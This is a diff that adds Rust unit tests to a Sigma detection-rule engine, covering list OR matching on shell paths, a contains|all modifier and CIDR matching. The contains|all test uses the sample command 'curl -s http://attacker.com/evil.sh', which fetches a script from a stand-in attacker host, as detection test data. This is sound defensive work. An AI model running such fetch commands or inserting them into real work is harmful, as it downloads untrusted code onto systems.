@@ -106,3 +106,80 @@ detection:
     fail_evt.insert("CommandLine".to_string(), "/tmp/too_long_for_regex".to_string());
     assert!(!engine.evaluate(&fail_evt));
 }
+
+#[test]
+fn test_sequence_default_or_logic() {
+    let yaml = r#"
+title: "Test Sequence List OR"
+id: "test-seq-1"
+detection:
+  selection:
+    Image|endswith:
+      - "/sh"
+      - "/bash"
+      - "/zsh"
+  condition: "selection"
+"#;
+    let rule = make_rule(yaml);
+    let engine = SigmaEngine::parse(&rule).unwrap();
+
+    let mut evt1 = HashMap::new();
+    evt1.insert("Image".to_string(), "/usr/bin/zsh".to_string());
+    assert!(engine.evaluate(&evt1));
+
+    let mut evt2 = HashMap::new();
+    evt2.insert("Image".to_string(), "/bin/bash".to_string());
+    assert!(engine.evaluate(&evt2));
+
+    let mut evt_fail = HashMap::new();
+    evt_fail.insert("Image".to_string(), "/usr/bin/python3".to_string());
+    assert!(!engine.evaluate(&evt_fail));
+}
+
+#[test]
+fn test_contains_all_modifier() {
+    let yaml = r#"
+title: "Test contains|all"
+id: "test-all-1"
+detection:
+  selection:
+    CommandLine|contains|all:
+      - "curl"
+      - "-s"
+      - "evil.sh"
+  condition: "selection"
+"#;
+    let rule = make_rule(yaml);
+    let engine = SigmaEngine::parse(&rule).unwrap();
+
+    let mut match_evt = HashMap::new();
+    match_evt.insert("CommandLine".to_string(), "curl -s http://attacker.com/evil.sh".to_string());
+    assert!(engine.evaluate(&match_evt));
+
+    // Missing "-s"
+    let mut fail_evt = HashMap::new();
+    fail_evt.insert("CommandLine".to_string(), "curl http://attacker.com/evil.sh".to_string());
+    assert!(!engine.evaluate(&fail_evt));
+}
+
+#[test]
+fn test_cidr_matching() {
+    let yaml = r#"
+title: "Test CIDR"
+id: "test-cidr-1"
+detection:
+  selection:
+    DestinationIp|cidr: "10.0.0.0/8"
+  condition: "selection"
+"#;
+    let rule = make_rule(yaml);
+    let engine = SigmaEngine::parse(&rule).unwrap();
+
+    let mut match_evt = HashMap::new();
+    match_evt.insert("DestinationIp".to_string(), "10.12.34.56".to_string());
+    assert!(engine.evaluate(&match_evt));
+
+    let mut fail_evt = HashMap::new();
+    fail_evt.insert("DestinationIp".to_string(), "192.168.1.1".to_string());
+    assert!(!engine.evaluate(&fail_evt));
+}
